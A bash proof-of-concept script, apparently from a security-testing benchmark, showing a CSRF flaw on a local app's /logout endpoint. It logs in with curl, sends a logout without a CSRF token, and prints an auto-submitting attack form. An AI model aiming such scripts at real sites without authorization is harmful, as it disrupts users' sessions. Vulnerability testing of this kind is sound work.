#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint by sending POST request without CSRF token validation, resulting in successful session termination
# Target: ./repo
# Created: 2025-11-04T20:01:45.796Z
# Session: benchmark-XBEN-027-24-mhkznijf

# CSRF Logout Endpoint Vulnerability POC
# This script demonstrates a CSRF vulnerability on the /logout endpoint
# The endpoint accepts POST requests without requiring CSRF token validation

TARGET_URL="${1:-http://localhost:8080}"
LOGOUT_ENDPOINT="/logout"

echo "[*] CSRF Logout Endpoint Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Obtain a valid session by logging in
echo "[+] Step 1: Attempting to establish a session..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "${TARGET_URL}/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}')

echo "[+] Login Response: $LOGIN_RESPONSE"
echo ""

# Check if we got session cookies
if [ -f /tmp/cookies.txt ] && grep -q "session\|auth_token" /tmp/cookies.txt; then
    echo "[+] Session established successfully"
    echo "[+] Cookies received:"
    cat /tmp/cookies.txt
    echo ""
else
    echo "[-] No session cookies received. The login may have failed or the endpoint doesn't exist."
    echo "[*] Proceeding with demonstration using a hypothetical valid session..."
    echo ""
fi

# Step 2: Send logout request WITHOUT CSRF token
echo "[+] Step 2: Sending POST request to $LOGOUT_ENDPOINT endpoint WITHOUT CSRF token..."
echo "[*] Expected behavior: Logout should FAIL (CSRF protection enabled)"
echo "[*] Actual behavior: If vulnerable, logout SUCCEEDS despite missing CSRF token"
echo ""

LOGOUT_RESPONSE=$(curl -s -b /tmp/cookies.txt -i -X POST "${TARGET_URL}${LOGOUT_ENDPOINT}" \
  -H "Content-Type: application/json" \
  -w "\n%{http_code}")

# Parse response code
HTTP_CODE=$(echo "$LOGOUT_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$LOGOUT_RESPONSE" | head -n -1)

echo "[+] HTTP Response Code: $HTTP_CODE"
echo "[+] Response Headers and Body:"
echo "$RESPONSE_BODY"
echo ""

# Step 3: Analyze the response for vulnerability indicators
echo "[+] Step 3: Analyzing response for CSRF vulnerability indicators..."
echo ""

if [[ "$HTTP_CODE" == "302" ]] || [[ "$HTTP_CODE" == "303" ]] || [[ "$HTTP_CODE" == "200" ]]; then
    echo "[!] VULNERABLE: Logout request was accepted (HTTP $HTTP_CODE)"
    
    if echo "$RESPONSE_BODY" | grep -q "Set-Cookie.*session\|Set-Cookie.*auth"; then
        echo "[!] Session cookie was cleared in response - logout succeeded"
        echo "[!] CSRF VULNERABILITY CONFIRMED: Logout accepted without CSRF token validation"
    else
        echo "[*] Response suggests logout processing occurred"
    fi
else
    echo "[*] Logout request returned HTTP $HTTP_CODE (May indicate CSRF protection or other error)"
fi

echo ""
echo "[+] Step 4: Demonstrating CSRF attack vector..."
echo "[*] An attacker could embed this in a malicious webpage:"
echo ""
echo '<html>'
echo '<body onload="document.forms[0].submit()">'
echo '<form method="POST" action="'${TARGET_URL}${LOGOUT_ENDPOINT}'">'
echo '  <input type="hidden" name="csrf_token" value="fake_token" />'
echo '</form>'
echo '</body>'
echo '</html>'
echo ""

echo "[+] POC completed"
echo ""

# Cleanup
rm -f /tmp/cookies.txt